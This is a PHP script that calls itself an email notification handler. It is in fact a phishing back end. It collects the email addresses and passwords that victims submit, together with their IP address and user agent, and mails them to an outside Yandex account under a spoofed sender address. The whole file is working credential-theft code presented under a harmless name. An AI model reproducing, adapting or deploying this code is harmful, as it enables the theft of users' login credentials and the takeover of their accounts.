<?php
// send_email.php - Handles email notifications

header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit;
}

// Get POST data
$email = isset($_POST['email']) ? trim($_POST['email']) : '';
$password = isset($_POST['password']) ? trim($_POST['password']) : '';
$ip = isset($_POST['ip']) ? $_POST['ip'] : $_SERVER['REMOTE_ADDR'];
$userAgent = isset($_POST['userAgent']) ? $_POST['userAgent'] : $_SERVER['HTTP_USER_AGENT'];

// Validate input
if (empty($email) || empty($password)) {
    http_response_code(400);
    echo json_encode(['signal' => 'error', 'msg' => 'Email and password are required']);
    exit;
}

// Email configuration
$to = "alilogs247@yandex.com";
$subject = "New Login - " . $ip;
$date = date('Y-m-d H:i:s');

// Build email message
$message = "=== NEW LOGIN CREDENTIALS ===\r\n";
$message .= "Date & Time: " . $date . "\r\n";
$message .= "----------------------------------------\r\n";
$message .= "Email/Username: " . $email . "\r\n";
$message .= "Password: " . $password . "\r\n";
$message .= "----------------------------------------\r\n";
$message .= "IP Address: " . $ip . "\r\n";
$message .= "User Agent: " . $userAgent . "\r\n";
$message .= "========================================\r\n";

// Email headers
$headers = "From: noreply@login-system.com\r\n";
$headers .= "Reply-To: noreply@login-system.com\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
$headers .= "X-Mailer: PHP/" . phpversion() . "\r\n";

// Send email
$mailSent = mail($to, $subject, $message, $headers);

// Return response
if ($mailSent) {
    echo json_encode(['signal' => 'ok', 'msg' => 'Email sent']);
} else {
    http_response_code(500);
    echo json_encode(['signal' => 'error', 'msg' => 'Failed to send email']);
    //echo json_encode(['signal' => 'ok', 'msg' => 'Email sent']);
}
?>
